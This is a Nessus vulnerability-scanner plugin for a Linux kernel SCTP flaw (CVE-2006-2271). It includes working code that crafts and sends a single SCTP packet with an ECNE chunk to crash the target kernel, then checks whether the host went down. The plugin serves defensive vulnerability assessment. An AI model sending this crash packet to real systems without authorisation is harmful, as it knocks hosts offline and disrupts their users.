#
# (C) Tenable Network Security
#


if ( NASL_LEVEL < 2204 ) exit(0);


if (description) {
  script_id(21560);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2006-2271");
  script_bugtraq_id(17910);
  script_xref(name:"OSVDB", value:"25632");

  script_name(english:"Linux SCTP Unexpected ECNE Chunk Denial of Service Vulnerability");
  script_summary(english:"Sends an SCTP packet with an unexpected ECNE chunk");
 
  desc = "
Synopsis :

It is possible to crash the remote host by sending it an SCTP packet. 

Description :

There is a flaw in the SCTP code included in Linux kernel versions
2.6.16.x that results in a kernel panic when an SCTP packet with an
unexpected ECNE chunk is received in a CLOSED state.  An attacker can
leverage this flaw to crash the remote host with a single, possibly
forged, packet. 

See also :

http://labs.musecurity.com/advisories/MU-200605-01.txt
http://www.kernel.org/pub/linux/kernel/v2.6/ChangeLog-2.6.17

Solution :

Upgrade to Linux kernel version 2.6.17 or later. 

Risk factor : 

Low / CVSS Base Score : 3.3
(AV:R/AC:L/Au:NR/C:N/I:N/A:C/B:N)";
  script_description(english:desc);
 
  script_category(ACT_KILL_HOST);
  script_family(english:"Denial of Service");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");
 script_dependencie("os_fingerprint.nasl");

  exit(0);
}


include("raw.inc");

os = get_kb_item("Host/OS/icmp");
if ( os && "Linux" >!< os ) exit(0);


if (islocalhost()) exit(0);
if (!get_host_open_port()) exit(0);


# Construct a malicious SCTP packet.
sctp = 
  # SCTP header
  mkword(rand()) +                     # source port
  mkword(rand()) +                     # destination port
  mkdword(0) +                         # verification tag
  mkdword(0) +                         # checksum (to be added later)

  # SCTP chunk 1
  mkbyte(12) +                         # type (12 => ECNE)
  mkbyte(0) +                          # flags
  mkword(8) +                          # length
  crap(4);                             # data
chksum = inet_sum(sctp);
ip = ip(ip_p:132);                     # SCTP
sctp = payload(insstr(sctp, mkdword(chksum), 8, 11));
boom = mkpacket(ip, sctp);


# Send packet and check whether the host is down.
start_denial();
send_packet(boom, pcap_active:FALSE);
alive = end_denial();
if (!alive)
{
  set_kb_item(name:"Host/dead", value:TRUE);
  security_note(0);
}
